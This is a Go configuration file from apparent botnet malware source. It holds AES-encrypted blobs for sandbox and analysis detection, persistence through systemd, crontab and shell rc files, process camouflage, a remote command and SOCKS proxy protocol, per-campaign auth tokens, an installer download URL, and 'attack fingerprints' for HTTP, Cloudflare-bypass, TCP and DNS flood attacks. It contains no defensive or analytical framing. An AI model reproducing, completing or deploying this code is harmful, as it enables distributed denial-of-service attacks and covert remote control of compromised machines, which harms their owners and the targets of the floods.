package main

import (
	"encoding/hex"
	"strings"
	"time"
)

// ============================================================================
// CONFIGURATION
// All tuneable constants and variables live here. setup.py updates this file.
// ============================================================================

// verboseLog enables verbose logging to stdout (set false for production).
var verboseLog = true

// --- Service connection ---

// serviceAddr holds the resolved service address, decoded at runtime from rawServiceAddr.
var serviceAddr string

// configSeed is the 8-char hex seed used for key derivation.
const configSeed = "dd98f916" //change me run setup.py

// syncToken is the shared auth token — must match server.
const syncToken = "EHos7NLjh%z5XHfM" //change this per campaign

// buildTag must match the server's version string.
const buildTag = "V5_8" //change this per campaign

// retryFloor and retryCeil define the range for randomised reconnection delays.
var retryFloor = 4 * time.Second
var retryCeil = 7 * time.Second

// --- Proxy ---

// proxyUser and proxyPass gate the proxy interface.
// Leave both empty to allow unauthenticated access.
// Protected by sockCredsMutex for concurrent read/write safety.
var proxyUser = ""
var proxyPass = ""

// maxSessions caps concurrent proxy connections.
var maxSessions int32 = 100

// --- Misc ---

// workerPool is the default number of concurrent workers.
var workerPool = 2024

// bufferCap is the standard buffer size for I/O operations.
const bufferCap = 256

// fetchURL is NOT encoded — needs to be easily updated per deployment.
var fetchURL = "http://127.0.0.1/mods/installer.sh"

// ============================================================================
// RUNTIME DATA (AES-128-CTR)
// No plaintext in the binary. Decoded at runtime by initRuntimeConfig().
// setup.py generates a random key per build and re-encrypts all blobs.
// Re-generate with: python3 setup.py
// ============================================================================

// Runtime-decoded values (populated by initRuntimeConfig before use)
var (
	// Sandbox / analysis detection
	sysMarkers   []string
	procFilters  []string
	parentChecks []string

	// Persistence paths
	rcTarget    string
	storeDir    string
	scriptLabel string
	binLabel    string
	unitPath    string
	unitName    string
	unitBody    string
	tmplBody    string
	schedExpr   string
	envLabel    string
	cacheLoc    string
	lockLoc     string

	// Protocol strings
	protoChallenge  string
	protoSuccess    string
	protoRegFmt     string
	protoPing       string
	protoPong       string
	protoOutFmt     string
	protoErrFmt     string
	protoStdoutFmt  string
	protoStderrFmt  string
	protoExitErrFmt string
	protoExitOk     string
	protoInfoFmt    string

	// Response messages
	msgStreamStart  string
	msgBgStart      string
	msgPersistStart string
	msgKillAck      string
	msgSocksErrFmt  string
	msgSocksStartFmt string
	msgSocksStop    string
	msgSocksAuthFmt string

	// DNS / URL infrastructure
	dohServers    []string
	dohFallback   []string
	dohAttack     []string
	resolverPool  []string
	speedTestURL  string
	dnsJsonAccept string

	// Attack fingerprints
	shortUAs        []string
	refererList     []string
	httpPaths       []string
	cfPaths         []string
	cfCookieName    string
	tcpPayload      string
	dnsFloodDomains []string
	alpnH2          string

	// System / camouflage
	camoNames      []string
	shellBin       string
	shellFlag      string
	procPrefix     string
	cmdlineSuffix  string
	pgrepBin       string
	pgrepFlag      string
	devNullPath    string
	systemctlBin   string
	crontabBin     string
	bashBin        string
)

// --- Raw blobs (IV+ciphertext, AES-128-CTR, key = XOR byte functions in opsec.go) ---
// @encrypt:single — setup.py uses these tags to identify vars for re-encryption

var rawServiceAddr, _ = hex.DecodeString("b840d9551b6370b563451a1b2f88503a180971b0e8c1a75eee52aa8cf1078cc3fb0ebfc2edd2267167897f76dd13c205cb4b1826d1d3dad9") //change me run setup.py

// @encrypt:slice sysMarkers
var rawSysMarkers, _ = hex.DecodeString("1081e39caaa2839e40fad16fbaab4ec9e1bda2490a136ae427860b12f2307972404db0ba26a8d943ae1381a8da806b6cf33b1e23ebe8bcd84ed5f641e39027edc233ca127fb0bd78528f0b56373a91a296bc5fa161b9edc9eb3db220d056e6e5d5f714fe32f06b5768fbe1c72e4f446cd0ea51639a8b2aa00837")
// @encrypt:slice procFilters
var rawProcFilters, _ = hex.DecodeString("0ced26265d29e05f2937b7fb1fb97440966f768fd4ae7c8328727cff3c2eef20418fb0d642f851480ed1c574e86af4356b1fcafcb756be5f62c6fad3a0f3a1ad16d98dbd57568f69c69ed17c323675b509fdf6c78286a1f13ae2057adcf6c57718b45c63a47793f9f64cffa5d1eb8d615535de312f0d6b84add05641d7be2909922e877a5c4d49fdb6969c5891b5409df74a826967e8826e2160a126848f5af933e289cc059c0b264992ddca7afc92268b240552980c6245e9f28d87da469c6cfd3a3e373a5a0cb92638a307ad59b113b104b6976b50f1ce7cdf83b5b6ea0187bcd1b0490c4d8befb4ef70c7337e69fc654d8f1baf50fb430955252fc2a51d26b484d14a3c1360a1ae5fc7ad9d3af12d0ba0406d63476ac17f94eb73cdbdda6850ad55a5e823c177f8228e0ba2283f8fa70f2f1f26848b79db9bbc7d14e5367f67344120feb5e0c36c99323f0fd16f17c3c82d2bc8bbcabd931218238cd29f7a40c3df0bbf9dfcf968f3ce9c85a4aa94889d29858bfc3686b595eca13568cc3b2d98ba58e32801fd96dc02a658e4740d8f4544bb6504f1fe94c7066147ad073b783f087e1354a9d0d72a786e4ee3e55faf4a27324e0fdec5c33ef96b161789465405f02c6a9216e541047cc23c6b350f1d419b91cbc59ddfa7a06d942d2fa3f66260d975395ffd98b7d4c61048e013c5c4d6df048a0eced6d89e20c325c05313184a3d20bb8e374f2252890fca98d65d087579a0877eb21506d5221dbd845e4de0dd2d339cadeb20832b52d1be65ee936e2ab017b05026ca4d1701b832db5a89cc0d9ee60738e8f125dce872f324f8848edca2bde01331eb83cc03515c09613498f67159c0aa69c2007645aa95c95e1afc287cf85cdab436c36bbf28ca03fc03141e7371434eaba52735053a009677a3fd75e2fb5baecf6088fcfa4b25e200ae369a36638cb27f35dd9786803cae0e3d4e1eb9077a9764436509a16ed94397dad511e7066f71c9724d0a2f11fd140b3d323b930759e82c2f9997610de28ae94498d789a0cdffeb2e4d74edd4305775889a5596dd5080fa8d51d8f563f23a237275a222cd56b690372f9ac9e7e59cf4efd83fc23bbfc9510548c8f5ca41b52076d61e7c59fb43b20a86483942ddd49d041200b721cfe8d1fff46b")
// @encrypt:slice parentChecks
var rawParentChecks, _ = hex.DecodeString("55e5e8625dc99494978953dadb85e6056dba948d0b32d8a35763820f8a5ce8a840666e0ac6c982c761fc3cc2f443897949f848a8e0288304bef236bf179ebe39097fd5d6d6a3ffa1b37103d85b8f06e1e04a9ab64ce431557f65f073b44d7344e3651c0b4caa6b5066b40707acd61f97cd56f9f49b3be607a21a53ae")

// @encrypt:single rcTarget
var rawRcTarget, _ = hex.DecodeString("4392f1754a2d860faaef353360f48bb3190ea2879c9b0934b9af5a51e0")
// @encrypt:single storeDir
var rawStoreDir, _ = hex.DecodeString("229df1f1d5c847db71e30f994ece1cace4313a4bab0c20c73ae0083ecc818d7d7ec7158ace")
// @encrypt:single scriptLabel
var rawScriptLabel, _ = hex.DecodeString("d36d2eee88d583e7c3640c62a35f17bd3cdee2270890b0eff3cb3d0dac84d3")
// @encrypt:single binLabel
var rawBinLabel, _ = hex.DecodeString("13e3ebe6f625fda03d024415927a0750b1bd4e0423e5630456132cb04f")
// @encrypt:single unitPath
var rawUnitPath, _ = hex.DecodeString("90201ed7c2ff21fb8291cbc24ab39fdcdb7c9950ea75808825b1a43ba66a4b4bd2446330390c9b09d4b3273f4c940e1867369dec3e1df6")
// @encrypt:single unitName
var rawUnitName, _ = hex.DecodeString("38612bde00401d50e8eca1d3bc94a5fbca7ffa4c60af93ff30762f5abef92c3fd9d170")
// @encrypt:single unitBody
var rawUnitBody, _ = hex.DecodeString("e9786c48c3f2410ab2ff75fbbdbfed1fc44dc4e2475eacd904b7f061df3253c44c44178151b12ad098dc0b2c7047ec66d04f6b98d7c9116397bc6bb9d59044843871b2e14fc18896e257925d1d32333dcb5b9d2f8d7661d5b6daa83a3137cd30970f0f8f983d35053187e21907072af64a9697421a4ac8959ba8a11285d579df83109d4e29d80a64d85b7db45588895c188ce2f20fe8185af3fcf27db83f1603c6c98dc35801169c497f66eee3a4606558500542fff6b805bf5b7e750e372ff38f91a9d9cd3b6c6ff14e0685b5493c")
// @encrypt:single tmplBody
var rawTmplBody, _ = hex.DecodeString("616c257dfd8dbe99d4c5297cfd7d6da1296f55f407482201b1a32d19ae69a13450b4955c29993494f5544870cbfcb650a6c834464e2ec6db781b28088fffc552084a20dcdc84da6457bf6a91785f171abdb8d66e622814d856cfeb684c8b8f198b0c146567dfa03dcc18a22a97642ea2035672854b2c1c1470fd6c744a56ce071e988dafce54cd6b583c2fe6fa99ae81f98ee495893ee9c1376803ffafcb9ed024ef68f6eeeb1bbf745a4620ea3b7b00772c710818f7300c59691b13caa7d2fd2b713c7fd2ce")
// @encrypt:single schedExpr
var rawSchedExpr, _ = hex.DecodeString("5d90f257636c4e42624d521b9d7c70f217173d18a687b224e2")

// @encrypt:single envLabel
var rawEnvLabel, _ = hex.DecodeString("59a71472daf3c47e3552c3f55ff2f52ddf843f4ec48bdf7fd2d647633f")
// @encrypt:single cacheLoc
var rawCacheLoc, _ = hex.DecodeString("6768d0855338e996dc0b6e48f0af684760022d455abda21c19df7d9c0c6955ec")
// @encrypt:single lockLoc
var rawLockLoc, _ = hex.DecodeString("669d232b1569b1af1284de13e1303ea8da64e633337e80ce9accf29f452d")

// --- Protocol blobs ---

// @encrypt:single protoChallenge
var rawProtoChallenge, _ = hex.DecodeString("eafa2fa83b28103a706a0369ba0da70d135339c13a3653a45ed65cb9fa28ee")
// @encrypt:single protoSuccess
var rawProtoSuccess, _ = hex.DecodeString("99cb72e8ba2436460fc27e42e300813abdb9bbac8016b8f24a834bcd")
// @encrypt:single protoRegFmt
var rawProtoRegFmt, _ = hex.DecodeString("89d429bf3c5a566428c5dd3a3c4d4f722a37dbc2c47d04b769082c3fda2b9fdaec08835b4727521e12bb3ed6d239cfe3")
// @encrypt:single protoPing
var rawProtoPing, _ = hex.DecodeString("c941ef6f4195df877822453083ff6b47248270f9")
// @encrypt:single protoPong
var rawProtoPong, _ = hex.DecodeString("7958656a561467e85412fcea195c9936f10b5450cc")
// @encrypt:single protoOutFmt
var rawProtoOutFmt, _ = hex.DecodeString("a115a4ee672ab5fc0d22e867f09e88098bd4483965846598792b13c3b88db1")
// @encrypt:single protoErrFmt
var rawProtoErrFmt, _ = hex.DecodeString("294ba3db72bedd39e5270e8279aac50dd16fa553021d9925ec09")
// @encrypt:single protoStdoutFmt
var rawProtoStdoutFmt, _ = hex.DecodeString("fd0b6e96bf8116a8d3e12b9192e5cb8090106413ea0ff836cac886")
// @encrypt:single protoStderrFmt
var rawProtoStderrFmt, _ = hex.DecodeString("2dc1bc14ecfeae9b4c1d1a046a44076a5b0db5e9e9daacaee703a6")
// @encrypt:single protoExitErrFmt
var rawProtoExitErrFmt, _ = hex.DecodeString("a6a8904a262520801473fa8bdce12357d7b0bd897b665316b379029ccee709")
// @encrypt:single protoExitOk
var rawProtoExitOk, _ = hex.DecodeString("5c4113cf7954ccc77281eef8f5b4dbec2735aa8f0da187f8a3ad924b22f306554835f623da0b71ca64e39f69e1f60db7551ffe5f2b")
// @encrypt:single protoInfoFmt
var rawProtoInfoFmt, _ = hex.DecodeString("c65cb4957d5c89ed966930d25c59ca942f506db086b7a062c4")

// --- Response message blobs ---

// @encrypt:single msgStreamStart
var rawMsgStreamStart, _ = hex.DecodeString("770681948d1d5c7a0688c88b32bf794b1cfda3b82a852972fa3303ce21ea56a272b3")
// @encrypt:single msgBgStart
var rawMsgBgStart, _ = hex.DecodeString("49b91b667734e81d8dd882f2c5638f11735b8fc58f8975da7202c1dbda34bb7ee2ee93b6d33f4e19ef2073ccb578")
// @encrypt:single msgPersistStart
var rawMsgPersistStart, _ = hex.DecodeString("d310edb17116bc1550e29c77f7bc504b6a537892968f2482bd3caeb3bd793498c525122cd241c3093e5392f4")
// @encrypt:single msgKillAck
var rawMsgKillAck, _ = hex.DecodeString("f749902cbbb8e255bbefe71092f24bf6a340ca5c7e9fb69cc54a6ac5184bc79d1883133644822698e2a07e9f6910235af9fe7d870247a35eeeca")
// @encrypt:single msgSocksErrFmt
var rawMsgSocksErrFmt, _ = hex.DecodeString("f48acb1f114bd963d00f5cfb117183e7e1a8a45c933d3c02fc4eec10370fa2c2")
// @encrypt:single msgSocksStartFmt
var rawMsgSocksStartFmt, _ = hex.DecodeString("e21221f186d4676a2b9c8565c1c66dd116b227284e0d30f88e397606b9461cf5fa94b7cfb15318b20f0caaed2ee8ef53")
// @encrypt:single msgSocksStop
var rawMsgSocksStop, _ = hex.DecodeString("29c24cc7a0dcf0708661e1ed9dd294a1a0437c9b4920f8f6713f02d6f0f60b67e974ab1062")
// @encrypt:single msgSocksAuthFmt
var rawMsgSocksAuthFmt, _ = hex.DecodeString("9148468787010f2e3ea268c3c7da97d547d5810c3d18c103564a0d564172318cf1761024bd7aa433bc24bb59bde38c")

// --- DNS / URL infrastructure blobs ---

// @encrypt:slice dohServers
var rawDohServers, _ = hex.DecodeString("9e197282659a9816473d0a54462df70d26ae0b22ae0432e947b3194063eec685f4aa19f0648eabc4be3f033255a041624a09476fafa0e8eede7d4f95c70199236069b873f71eeb99036b8d959ea336523482363fd3b90c7fa6fa2ce5cec12260ce75d0c85987ddb7d59b2382d51f1ecd08")
// @encrypt:slice dohFallback
var rawDohFallback, _ = hex.DecodeString("5ff1d0737aa39f0d69fe458d7ceba5bc12ebc97e924f6c20bd139a965a016ca7aea284318c72d8389305c68f91713f32a82ab5ece55ad6558ce052db176b8327e9ebf07c06aa83bea3e1776471d1844769")
// @encrypt:slice dohAttack
var rawDohAttack, _ = hex.DecodeString("099f58bac48ec3578a597f72f5d815daf6bad86fb441196445de696147a6fd7d97ef1e9514b7e546985f3777e472f8cbb8dd23ed062a00c2f4e07c0d8a078b1df463be110215c630d531fde13181")
// @encrypt:slice resolverPool
var rawResolverPool, _ = hex.DecodeString("d6c4ec0cdb34fae38eebddeabdbc8a606faaf1eb2c8c56dea27f86310908b3134e0e0888f1be46d21a0c23167509bff99fbb4c6bd630508f28161f000995800d6c35cb64feded291deddc0cff4")
// @encrypt:single speedTestURL
var rawSpeedTestURL, _ = hex.DecodeString("143931a9517ecd1666169ba7b2bd148fb4352f269e51d2884ff0f2076d2afcc20ebfac4c72d408a714783c5205ed65071f213a875a66a2ec5de0f5a87ab2ad")
// @encrypt:single dnsJsonAccept
var rawDnsJsonAccept, _ = hex.DecodeString("eb1889963e1c37a7eeb8bc93dfa84b6d46d371a4f720b03cd51c8d5f2a15a333f3272980")

// --- Attack fingerprint blobs ---

// @encrypt:slice shortUAs
var rawShortUAs, _ = hex.DecodeString("a444efa3f87a737452a92da85cafad4f4c8ed19411d06d7994496946eeeff4f7f360c7d28687390f00c737ba1a95ebae6beb52a44276e0fb06d6d267e97f7c501f9f649f28ae1629e0ea4309f208bd1e9f457d180c9351cba38d0e8b84cdeb6c457d8b9e016e3e25ba2fc697d419e6eb9148eea84f65a39f2910e43fcab79f0316ca8b1a30d69af34bb08e5a716b300d9a7bd1459348c3dc439096be0071bbdb4c7a48c82502f483dd6b02083ed94d766a7dd52262208ac8b9362bc0b79a2d75d82c413d672451cfe3a1aaf166cb757bc5c09411d6221150575a167e19")
// @encrypt:slice refererList
var rawRefererList, _ = hex.DecodeString("79024f60f8502d1c5d4d8a34a798a07e9cd735acd5b29af2ecaa2abece2f299f9a1e97e5071e2f7b757a8ddd15eb7038eb4c9de1037a9d62f00919c1524dc41c54aff84a64426077da19147743c862d02474dbd0e5cd0fafffed84")
// @encrypt:slice httpPaths
var rawHttpPaths, _ = hex.DecodeString("9df3f3cbd937846c1ef4b7f76cc05ec740adb39ca1566a4ceb5ce10a30cac7b62bf29cf0f0a7242eba507a293e6832429494ff8306501c9a57971e")
// @encrypt:slice cfPaths
var rawCfPaths, _ = hex.DecodeString("a6d2878971656546e1291cef2499a4760d1b5d0c850f2fc92a957ac79a8d7295511eff724b8694200dbb41b80a9a93009affe089c4592cb178fac15bbf1adf6e93fe0ba6389e359463")
// @encrypt:single cfCookieName
var rawCfCookieName, _ = hex.DecodeString("2531dd23e3e8962163ff7118293f5e6f4f873fbc239d67")
// @encrypt:single tcpPayload
var rawTcpPayload, _ = hex.DecodeString("abb25685770aa97c04c1ed1b98ab4179304185eaf8003175ff46fdc280987ede1146")
// @encrypt:slice dnsFloodDomains
var rawDnsFloodDomains, _ = hex.DecodeString("0a18aca7400433b0a3db016d291c7c5363d46cb26af65d796f3f1530f196e1b6770c41dc3f246e2327e7b8aabe03fa5618ba8e299fab22b133fdb8defbc7d242ef06de9b048a2d5093883fc3bb131ca5515afb7e7f1a127f3ed1256fc016f6")
// @encrypt:single alpnH2
var rawAlpnH2, _ = hex.DecodeString("c063667958377e4cac8219a28771c179b645")

// --- System / camouflage blobs ---

// @encrypt:slice camoNames
var rawCamoNames, _ = hex.DecodeString("ae0f7d5e3c8332d72b3881751f5ff5b581e3d5cec67e0c92fb77324cc009cb3534ccace353126c4049c07ab6397dc493a8dcdbe7ec")
// @encrypt:single shellBin
var rawShellBin, _ = hex.DecodeString("f094bd9de4c7575c1c45e13884b037aa23a9")
// @encrypt:single shellFlag
var rawShellFlag, _ = hex.DecodeString("f3febc1a43199070ce04a97f161d9bf74153")
// @encrypt:single procPrefix
var rawProcPrefix, _ = hex.DecodeString("036480682bdd77c8b1202e1a5e6fda23fc293208b710")
// @encrypt:single cmdlineSuffix
var rawCmdlineSuffix, _ = hex.DecodeString("486f23a47ba0cd5156a91cf5686e0535ff672f06df61fa61")
// @encrypt:single pgrepBin
var rawPgrepBin, _ = hex.DecodeString("d2daea37effcbe59d8b2015893039ec204283e583f")
// @encrypt:single pgrepFlag
var rawPgrepFlag, _ = hex.DecodeString("20f13f9ec3349838e7c5aea4f000bb561c35")
// @encrypt:single devNullPath
var rawDevNullPath, _ = hex.DecodeString("35e3ddf586ba12970ea30a0dbcba7d057fba9bd4d0c2973a3e")
// @encrypt:single systemctlBin
var rawSystemctlBin, _ = hex.DecodeString("bc3f9f16506b994eae3701e547df09bc5640d77dc66619de64")
// @encrypt:single crontabBin
var rawCrontabBin, _ = hex.DecodeString("0eea327a4eb31611446b7b332065b4e0832f43b810d4ed")
// @encrypt:single bashBin
var rawBashBin, _ = hex.DecodeString("ff4133e7527e23531ec8e278c1a12b2236415409")

// initRuntimeConfig decodes all raw blobs into their runtime variables.
// Must be called once at startup before any code references these values.
func initRuntimeConfig() {
	// Service address (AES layer wrapping the 5-layer obfuscation)
	serviceAddr = string(garuda(rawServiceAddr))

	// Slice values (null-byte separated)
	sysMarkers = strings.Split(string(garuda(rawSysMarkers)), "\x00")
	procFilters = strings.Split(string(garuda(rawProcFilters)), "\x00")
	parentChecks = strings.Split(string(garuda(rawParentChecks)), "\x00")
	resolverPool = strings.Split(string(garuda(rawResolverPool)), "\x00")
	dohServers = strings.Split(string(garuda(rawDohServers)), "\x00")
	dohFallback = strings.Split(string(garuda(rawDohFallback)), "\x00")
	dohAttack = strings.Split(string(garuda(rawDohAttack)), "\x00")
	shortUAs = strings.Split(string(garuda(rawShortUAs)), "\x00")
	refererList = strings.Split(string(garuda(rawRefererList)), "\x00")
	httpPaths = strings.Split(string(garuda(rawHttpPaths)), "\x00")
	cfPaths = strings.Split(string(garuda(rawCfPaths)), "\x00")
	dnsFloodDomains = strings.Split(string(garuda(rawDnsFloodDomains)), "\x00")
	camoNames = strings.Split(string(garuda(rawCamoNames)), "\x00")

	// Persistence paths
	rcTarget = string(garuda(rawRcTarget))
	storeDir = string(garuda(rawStoreDir))
	scriptLabel = string(garuda(rawScriptLabel))
	binLabel = string(garuda(rawBinLabel))
	unitPath = string(garuda(rawUnitPath))
	unitName = string(garuda(rawUnitName))
	unitBody = string(garuda(rawUnitBody))
	tmplBody = string(garuda(rawTmplBody))
	schedExpr = string(garuda(rawSchedExpr))
	envLabel = string(garuda(rawEnvLabel))
	cacheLoc = string(garuda(rawCacheLoc))
	lockLoc = string(garuda(rawLockLoc))

	// Protocol strings
	protoChallenge = string(garuda(rawProtoChallenge))
	protoSuccess = string(garuda(rawProtoSuccess))
	protoRegFmt = string(garuda(rawProtoRegFmt))
	protoPing = string(garuda(rawProtoPing))
	protoPong = string(garuda(rawProtoPong))
	protoOutFmt = string(garuda(rawProtoOutFmt))
	protoErrFmt = string(garuda(rawProtoErrFmt))
	protoStdoutFmt = string(garuda(rawProtoStdoutFmt))
	protoStderrFmt = string(garuda(rawProtoStderrFmt))
	protoExitErrFmt = string(garuda(rawProtoExitErrFmt))
	protoExitOk = string(garuda(rawProtoExitOk))
	protoInfoFmt = string(garuda(rawProtoInfoFmt))

	// Response messages
	msgStreamStart = string(garuda(rawMsgStreamStart))
	msgBgStart = string(garuda(rawMsgBgStart))
	msgPersistStart = string(garuda(rawMsgPersistStart))
	msgKillAck = string(garuda(rawMsgKillAck))
	msgSocksErrFmt = string(garuda(rawMsgSocksErrFmt))
	msgSocksStartFmt = string(garuda(rawMsgSocksStartFmt))
	msgSocksStop = string(garuda(rawMsgSocksStop))
	msgSocksAuthFmt = string(garuda(rawMsgSocksAuthFmt))

	// DNS / URL infrastructure
	speedTestURL = string(garuda(rawSpeedTestURL))
	dnsJsonAccept = string(garuda(rawDnsJsonAccept))

	// Attack fingerprints
	cfCookieName = string(garuda(rawCfCookieName))
	tcpPayload = string(garuda(rawTcpPayload))
	alpnH2 = string(garuda(rawAlpnH2))

	// System / camouflage
	shellBin = string(garuda(rawShellBin))
	shellFlag = string(garuda(rawShellFlag))
	procPrefix = string(garuda(rawProcPrefix))
	cmdlineSuffix = string(garuda(rawCmdlineSuffix))
	pgrepBin = string(garuda(rawPgrepBin))
	pgrepFlag = string(garuda(rawPgrepFlag))
	devNullPath = string(garuda(rawDevNullPath))
	systemctlBin = string(garuda(rawSystemctlBin))
	crontabBin = string(garuda(rawCrontabBin))
	bashBin = string(garuda(rawBashBin))
}
